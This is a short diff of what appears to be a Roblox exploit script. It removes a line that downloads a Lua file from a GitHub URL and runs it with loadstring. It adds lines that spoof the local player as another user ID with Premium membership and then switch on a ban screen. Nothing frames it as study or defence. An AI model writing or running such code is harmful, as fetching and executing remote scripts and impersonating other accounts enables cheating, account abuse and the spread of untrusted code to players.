@@ -1,3 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Imalwibest/Imalwibest/main/wynerdV2.lua",true))()
-task.wait()
+local name = game.Players:GetNameFromUserIdAsync(915645977)
+game.Players:SetLocalPlayerInfo(915645977, name, name, Enum.MembershipType.Premium, false)
+wait(.1)
 game.Players.LocalPlayer.PlayerGui.BanUi.Enabled = true
